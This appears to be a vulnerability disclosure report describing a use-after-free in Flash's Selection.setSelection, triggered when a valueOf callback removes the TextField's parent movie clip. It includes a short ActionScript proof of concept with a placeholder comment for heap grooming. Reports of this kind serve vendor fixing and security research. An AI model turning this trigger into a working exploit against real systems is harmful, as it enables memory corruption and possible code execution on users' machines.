There is a use-after-free in Selection.SetSelection. If it is called with a number parameter, which is an object with valueOf defined, and this function frees the parent of the TextField parameter, the object is used after it is freed. A minimal PoC follows:

var mc = this.createEmptyMovieClip("mc", 301);
var myText_txt = mc.createTextField("myText_txt", 302, 1, 1, 100, 100);
myText_txt.text = "this is my text";
Selection.setFocus("myText_txt");
var n = {valueOf : func};
Selection.setSelection(n, 3);

function func(){

  mc.removeMovieClip();
  // Fix heap here
  return 0;

}

A sample swf and fla are attached. Note that this PoC only works on 64-bit platforms.
